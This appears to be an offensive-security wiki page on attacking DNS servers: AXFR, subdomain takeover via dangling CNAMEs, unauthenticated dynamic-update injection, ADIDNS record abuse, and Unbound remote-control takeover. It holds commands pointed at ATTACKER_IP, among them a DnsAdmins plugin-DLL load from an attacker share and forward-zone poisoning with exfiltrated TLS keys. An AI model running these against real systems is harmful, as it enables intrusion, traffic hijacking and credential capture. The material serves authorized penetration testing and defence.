---
technology: "DNS"
kind: overview
audience: offensive-security
family: network-services
role: area-router
layer: name resolution protocol (53/tcp, 53/udp; CH TXT version.bind)
standards: "RFC 1034/1035 (DNS), RFC 2136 (dynamic update), MS-DNS (AD-integrated)"
status: confirmed
source: "rewritten from KathanP19/HowToHunt (Subdomain_Takeover/), GPL-3.0, accessed 2026-11-13"
provenance: "corpus-grounded (split probe with command-context gate, 2026-11-12: AD-integrated 14 files, generic zone-transfer/enum 6, BIND 3, dnsmasq 1 — BIND-dominant expectation from the loose probe did NOT survive the gate; 53/tcp open domain appears in 55 files but port banners alone are presence, not attack evidence) + upstream-verified (ISC KB aa-00307 version.bind, NVD CVE-2020-1350 SIGRed, krbrelayx dnstool README). Router/dispatch page; BIND variant: [[dns-bind]]. Enrichment pass 1, 2026-11-12. HTH INGEST 2026-11-13: dangling-CNAME takeover-verification block rewritten from KathanP19/HowToHunt (Subdomain_Takeover/), GPL-3.0, accessed 2026-11-13; claimability matrix grounded against EdOverflow/can-i-take-over-xyz (repo-verified, machine-refreshed fingerprints)."
---

# DNS (area router)

> The only service every network query touches: the same 53/udp port hides three different targets — a resolver, an authoritative server, or an AD domain controller's database — and picking the wrong one wastes the whole engagement.

## What it is

DNS (RFC 1034/1035) maps names to records, and everything about attacking it depends on **which role the server in front of you plays**. A **recursive resolver** (dnsmasq, Unbound, a domain controller's forwarder) answers queries for names it does not own — its attack surface is cache poisoning, rebinding, and leaking internal names via outbound queries. An **authoritative server** (BIND, NSD, PowerDNS, Windows DNS in a standalone zone) answers only for its zones — its surface is zone data exposure (AXFR), record injection via dynamic update, and implementation CVEs. An **AD-integrated** server stores its zones in the Active Directory database (the `DomainDnsZones` application partition) — its surface is *identity-adjacent*: whoever can write LDAP records or hold DnsAdmins owns name resolution, which in an AD forest is coercion, relay, and privilege escalation fuel.

The operator takeaway: fingerprint the role before touching anything. `dig` CHAOS-class TXT `version.bind` is the classic pre-auth probe — `dig @198.51.100.10 CH TXT version.bind` returns the BIND version string by default (nmap's `dns-bind-version` NSE reports the same as `bind.version:`; one observed target leaked `9.11.3-1ubuntu1.2-Ubuntu` this way). ISC documents that operators suppress it with `version none;` in `named.conf` options — and also that suppression does not prevent fingerprinting from response behavior. A Windows DNS server that also speaks LDAP/Kerberos on the same host is AD-integrated; route to the ADIDNS section below, not to the BIND playbook.

## The anatomy that matters on an engagement

    client → 53/udp|tcp → server (role?)
        ├─ resolver      → recursion for anyone? cache → poisoning/rebinding; internal leaks via your domain
        ├─ authoritative → zone data: AXFR (tcp/53), dynamic UPDATE (RFC 2136, TSIG-gated on BIND)
        │                   config exposure: named.conf paths, TSIG keys, allow-transfer ACLs
        └─ AD-integrated → zones = LDAP objects (DomainDnsZones partition)
                            → record write = coercion/relay/capture primitive; DnsAdmins = code exec as the DNS service

Three structural properties drive most findings:

- **Zone transfers are a query, not an exploit.** `dig axfr zone @server` over TCP works against any master whose transfer ACL includes you — misconfigured ACLs (a real deployment shipped `allow-transfer { 10.0.0.0/8; }`) hand over the entire internal namespace.
- **Dynamic update turns DNS into a write primitive when auth is weak.** RFC 2136 UPDATE messages are accepted by `nsupdate`-speaking servers if the zone allows nonsecure updates (one observed zone set to "Nonsecure and Secure" → unauthenticated record injection) or if you hold the TSIG key (one observed chain leaked `/etc/bind/infra.key`).
- **In AD, DNS records are directory objects.** Record creation is commonly delegated to authenticated users (the dominant pattern in observed engagements), so any foothold account becomes a name-redirect primitive.

## Where you'll meet it

- **Everywhere as context, selectively as target.** The `53/tcp open domain` banner is everywhere in recon output; most instances are presence, not attack surface. The real targets concentrate in: domain controllers (ADIDNS), internal BIND masters (zone + TSIG key exposure), and resolvers on segmented networks (rebinding/pivot).
- **Domain controllers** (14 observed engagements): ADIDNS abuse for coercion (SQL/MSSQL auth capture), Kerberos relay setup, WSUS host substitution, ADCS SPN enrollment — each shape observed in the field. Cross-ref [[ldap]] — the writes happen over LDAP, not the DNS wire.
- **Internal BIND boxes** (3 observed engagements): leaked TSIG keys + `nsupdate` = hostname-hijack to steal SSH sessions keyed on names; LFI into `/etc/bind/` reads `named.conf.local`, zone file paths, and transfer ACLs.
- **SOA-based external recon**: zone walking tools and subdomain enumeration against internet-facing authoritative servers (generic pattern, three observed engagements).

## Protocol-common attacks (any DNS server)

**Zone transfer against any master** — the first move regardless of implementation:

```bash
dig axfr example.com @198.51.100.10        # refused = ACL blocks you; XFR'd = full zone
dig AXFR sub.example.com @198.51.100.10    # try every zone you know: parent, delegated subs
dig @198.51.100.10 example.com NS +noall +answer   # then hit each NS in turn — ACLs differ per server
```

One observed AXFR pulled three unknown subdomains (`administrator1`, `hr`, `uploads`) out of a single unguarded zone; another leaked numeric hostnames. If AXFR refuses, still collect SOA/NS/MX/TXT (`host -t ns`, `host -t mx`) — SRV records are the AD tell (`_ldap._tcp`, `_kerberos._tcp` map the domain's DCs).

**Subdomain enumeration patterns** — dictionary and brute tooling (dnsenum, dnsrecon, fierce in the field as tool names, plus gobuster's DNS mode) resolves candidate names against the target's server; DNS wildcard detection (resolve a random name first — an answer means `*` exists and every "hit" is fake) gates the result list. one observed engagement shows the pivot: once you learn the internal domain name, walk PTR for whole subnets.

**Dangling CNAME records — subdomain takeover verification** — the loop that starts where enumeration stops, and the one external-surface class this protocol owns outright. The defect lives in the victim's own zone file: a CNAME (or A) record still pointing at a third-party service whose tenancy lapsed — the subscription cancelled, the app deleted, the bucket dropped — while nobody removed the record. DNS keeps aliasing; the origin claim is gone; whoever re-registers the name at the provider serves content on the victim's hostname.

```bash
# per-name CNAME sweep over the enumeration output
while read d; do dig +short CNAME "$d"; done < subdomains.txt | sort -u
# flag aliases into third-party service domains (*.cloudfront.net, *.herokuapp.com,
# *.myshopify.com-class) — then fetch each and read the response body
```

Verification is fingerprint-driven, not DNS-driven: fetch the dangling name and match the provider's no-tenant page — CloudFront's `ERROR: The request could not be satisfied`, Heroku's `No such app`, Shopify's half-finished-store setup template are the classic signatures. The arbiter for what is actually claimable is the maintained can-i-take-over-xyz matrix (EdOverflow; machine-refreshed fingerprint list) — several resonant error shapes belong to services nobody can re-register, and a claim attempt against one of those is a report that dies in triage. Claiming is service-specific: create the CloudFront distribution / Heroku app / store under your own account and attach the victim hostname as its custom domain (Shopify's connect-your-domain flow does it in one step); where the CNAME target is itself an expired REGISTRABLE domain, buying the domain takes the record set wholesale. The wildcard variant scales one finding into infinite names: a `*` record pointed at a provider with no matching wildcard binding on the service side leaves every unclaimed label open, and the takeover can inherit the provider-issued wildcard certificate for the victim's domain. Impact writes itself — attacker-controlled content under the victim's hostname (cookie scope included), a credentialed clone of the real site for phishing, and the credibility damage of serving attacker pages from the corporate domain. Scanners subzy, subjack, and the nuclei takeover templates automate the sweep over large asset lists, fed by subfinder/assetfinder-class enumeration.

**Dynamic update injection** — if the zone accepts unsecure updates, `nsupdate` adds records with no credentials (one observed chain had `update add test.example.internal 10 A ATTACKER_IP` accepted raw); on BIND the gate is TSIG (`nsupdate -k keyfile`), so any file-read primitive aimed at `/etc/bind/*.key` pays twice.

**Tunneling context** — dnscat-style C2 and DNS exfiltration ride *recursive resolvers*, not authoritative servers; know which personality you are attacking before claiming the technique applies.

## AD-integrated DNS (ADIDNS) — the section that pays in a domain

AD zones live in the directory (`CN=MicrosoftDNS,DC=DomainDnsZones,...`); every operation below is an LDAP write, cross-ref [[ldap]] for the underlying access model.

- **Record creation by (almost) anyone**: by default, authenticated users and DnsUpdateProxy-member machines can register records in many zones (one observed engagement: "ADIDNS abuse... add a new record that points to our own IP"). The tool is dnstool.py from the krbrelayx toolkit — it speaks LDAP to the DC, reads the zone serial over DNS, and adds/modifies/removes A records (`-a add -d ATTACKER_IP`).
- **Why a record is code exec fuel**: point a name clients trust at yourself — MSSQL coercion (one chain injected `SQL07.example.internal` → captured SQL auth), Kerberos relay over DNS (observed), WSUS update-source substitution (one chain registered the missing `wsus.example.internal` host), ADCS SPN enrollment (observed). Adding a *wildcard* record (`*` label — standard RFC 1034 wildcard semantics, answering for all otherwise-nonexistent names) is the ADIDNS capture-all variant of the same trick.
- **Secure dynamic updates**: when the zone is set to "Secure only", plain nsupdate fails (one observed engagement hit this) — the write then needs an account/machine credential through dnstool/LDAP instead.
- **DnsAdmins = service code execution**: membership lets you point the DNS service at a plugin DLL — `dnscmd localhost /config /serverlevelplugindll \\ATTACKER_IP\share\da.dll`, then restart the DNS service for execution as the DNS server process (observed in the field). A caveat: DnsAdmins does not by default log on to DCs or restart the service — you need a path to that too.
- **Windows DNS Server CVE context**: CVE-2020-1350 "SIGRed" (CVSS 10.0, wormable, CISA KEV) — a malicious DNS *response* with an oversized SIG record overflows dns.exe on DCs running the resolver role; patched 2020 July. Pre-2020 DC snapshots remain a one-shot domain-compromise check.

## Unbound resolver — remote-control takeover (8953/tcp)

Unbound ships a TLS **remote-control channel**: `control-enable: yes` makes
the daemon listen for `unbound-control` commands (default `control-port`
8953, `control-interface` loopback by default — an interface bound beyond
loopback is already a misconfiguration). With `control-use-cert: yes`
(default), the client authenticates with a **client key + client certificate
signed by the unbound server certificate**; `unbound-control-setup` generates
the four files (`unbound_server.key/.pem`, `unbound_control.key/.pem`). The
control plane is only as strong as the file permissions on those PEMs.

The chain: any file-read primitive on the resolver host reads the unbound
config to locate the TLS material, exfiltrates the client identity, and then
owns the channel from anywhere:

```bash
nmap -p 8953 198.51.100.10
# 8953/tcp open  ub-dns-control          <- the tell (or a bare tls/unknown banner)

# 1. Read the config to find the remote-control block (OpenBSD layout shown; Linux: /etc/unbound/)
cat /var/unbound/etc/unbound.conf
# remote-control: control-enable: yes ... include: conf.d/local_zones.conf
#   local_zones: forward targets must NOT collide with locally-defined zones

# 2. Exfiltrate through the file-read:
#    /var/unbound/etc/tls/unbound_server.pem    (server cert — verifies the server)
#    /var/unbound/etc/tls/unbound_control.key   (client private key)
#    /var/unbound/etc/tls/unbound_control.pem   (client cert, signed by the server cert)

# 3. Stage them on your box; /etc/unbound/unbound.conf:
#    remote-control:
#        control-enable: yes
#        control-use-cert: yes
#        server-cert-file:  "/etc/unbound/unbound_server.pem"
#        control-key-file:  "/etc/unbound/unbound_control.key"
#        control-cert-file: "/etc/unbound/unbound_control.pem"

unbound-control -s 198.51.100.10 stats      # counters returned = channel owned
unbound-control -s 198.51.100.10 list_stubs # error on hardened builds = restricted command set
```

Payoff — **forward-zone poisoning**. `forward_add` installs a forward zone
in the *running* server (the config file is untouched; a reload reverts it):
every query for that zone is handed to a nameserver you choose, and Unbound
does no further recursion for it — your server's answers are the answers.

```bash
# +i also adds a domain-insecure for the zone (resolves even with a DNSSEC trust anchor)
unbound-control -s 198.51.100.10 forward_add +i "zone.example.com" ATTACKER_IP
# then serve the records you want from ATTACKER_IP (FakeDNS-style fake-answers tooling)
```

Caveats from the chain: hardened builds expose only a subset of commands
(a stats/stats_noreset/status/forward_add/flush_stats set is a typical
survivor); forwarding a **subdomain of a locally-defined zone** is
refused — poison a zone that is absent from the local config instead. Every
consumer of that resolver now resolves the poisoned zone to your answers:
web front-ends that gate on Host headers or reverse-DNS resolve straight to
you. Roll back with `forward_remove` when done.

## Reading the protocol's mind

1. **`dig CH TXT version.bind`** answers before any auth on default BIND — a real string is a version gift; `none`/garbage means an operator who read the ISC KB, so fingerprint by behavior instead.
2. **AXFR over TCP** — if the server answers recursion for you at all and the ACL is broad, the zone falls out in one query; refused ≠ not authoritative, try each NS.
3. **An AD DC serving 53 is LDAP-backed** — DNS questions become "who can write objects", answered with LDAP enumeration, not with dig.
4. **Nonsecure dynamic updates** accept a raw RFC 2136 UPDATE — one `nsupdate` probe (`update add probe.example.com 60 A 198.51.100.99`) tests it non-destructively.
5. **SOA serial increments betray dynamic zones** — a serial that changes between queries means UPDATEs flow and record injection has a landing zone.

## Where to go next

[[dns-bind|BIND variant]] — named.conf exposure, allow-transfer, zone-file recon, TSIG key abuse, version banner suppression. ADIDNS chains continue in [[ldap]] and [[kerberos]].
